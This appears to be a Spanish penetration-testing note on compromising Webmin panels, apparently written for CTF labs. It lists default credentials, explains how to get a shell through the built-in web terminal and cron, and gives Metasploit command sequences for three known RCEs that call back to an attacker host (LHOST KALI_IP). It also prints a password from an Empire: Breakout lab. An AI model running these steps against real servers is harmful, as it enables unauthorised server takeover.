# Webmin

## Descripción

Webmin es un **panel de administración web para sistemas Unix/Linux**. Permite gestionar el sistema completo desde el navegador: usuarios, servicios, archivos, configuración de red, cron jobs, bases de datos y mucho más. Si consigues acceder, tienes control casi total del servidor.

**Puertos por defecto:**
- **10000** — Webmin (administración del sistema)
- **20000** — Usermin (panel para usuarios normales)

**Tecnología:** Perl + CGI
**Autenticación:** Usa los usuarios reales del sistema operativo Linux

---

## Identificación

Visita en el navegador:
```
http://TARGET_IP:10000
https://TARGET_IP:10000
http://TARGET_IP:20000
```

La página de login muestra la versión de Webmin en el título o en el pie de página.

---

## Autenticación

Webmin no tiene su propia base de datos de usuarios — usa las cuentas reales del sistema operativo Linux. Cuando introduces `usuario:contraseña`, Webmin le pregunta al propio Linux si esas credenciales son válidas.

Esto significa:
- Las mismas credenciales funcionan en el puerto 10000 y 20000
- Si obtienes las credenciales de un usuario del sistema (por cualquier medio), puedes acceder a Webmin

---

## Credenciales por defecto

```
root:root
admin:admin
admin:password
```

En muchos sistemas las credenciales son las del usuario `root` del sistema.

---

## Funcionalidades peligrosas una vez dentro

### Terminal web ⭐

La opción más directa para obtener RCE. Busca en el menú:
```
Others → Terminal
Tools → Terminal
```

Proporciona una shell interactiva en el navegador ejecutando comandos como el usuario que ha iniciado sesión.

### File Manager

Permite navegar, leer y modificar archivos del sistema con los permisos del usuario logueado.

### Scheduled Commands (Cron)

Permite crear tareas programadas que se ejecutan como el usuario logueado o como root.

### Command Shell

En algunas versiones hay un módulo específico de ejecución de comandos en `Others → Command Shell`.

---

## Vulnerabilidades conocidas

### Backdoor en versiones 1.890-1.920 — Sin autenticación ⭐

Alguien insertó código malicioso en el servidor de descargas de Webmin. El parámetro `old` de `password_change.cgi` ejecuta comandos sin autenticación.

```shell
# Metasploit
use exploit/unix/webapp/twiki_search
# No aplica — usar:
use exploit/linux/http/webmin_backdoor
set RHOSTS TARGET_IP
set LHOST KALI_IP
run
```

Solo afecta a versiones descargadas desde SourceForge entre 2018-2019.

### RCE via rpc.cgi — Autenticado (< 1.930)

Explota la función `unserialise_variable()` en `web-lib-funcs.pl`:

```shell
use exploit/unix/webapp/webmin_unserialise
set RHOSTS TARGET_IP
set WMUSER usuario
set WMPASS contraseña
set LHOST KALI_IP
run
```

### Package Updates RCE — Autenticado (1.910, 1.962)

```shell
use exploit/linux/http/webmin_packageup_rce
set RHOSTS TARGET_IP
set USERNAME usuario
set PASSWORD contraseña
set LHOST KALI_IP
run
```

---

## Búsqueda de exploits

```shell
searchsploit webmin VERSION
```

Versiones y sus exploits más relevantes:

| Versión | Exploit | Auth necesaria |
|---------|---------|----------------|
| 1.580 | File show.cgi RCE | No |
| 1.850 | XSS → RCE, CSRF | Sí |
| 1.890-1.920 | Backdoor RCE | No |
| < 1.930 | rpc.cgi RCE | Sí |
| 1.984 | RCE | Sí |

---

## Checklist rápido

```
[ ] Identificar versión en la página de login
[ ] searchsploit webmin VERSION
[ ] Credenciales por defecto (root:root, admin:admin)
[ ] Si tienes credenciales → Others → Terminal → shell directa
[ ] Versión 1.890-1.920 → probar backdoor sin autenticación
[ ] Versión < 1.930 con credenciales → rpc.cgi exploit
[ ] Si hay terminal web → no necesitas exploit
```

---

## Ejemplo real — Máquina Empire: Breakout

Webmin 1.830 en puerto 20000 y Webmin 1.981 en puerto 10000. Todos los exploits encontrados requerían autenticación. Se obtuvieron credenciales (`cyber:.2uqPEfj3D<P'a-3`) desde el código fuente del puerto 80.

Con acceso al panel, se usó **Others → Terminal** para obtener shell directa como `cyber` sin necesidad de ningún exploit. Desde esa terminal se escalaron privilegios via Linux Capabilities.
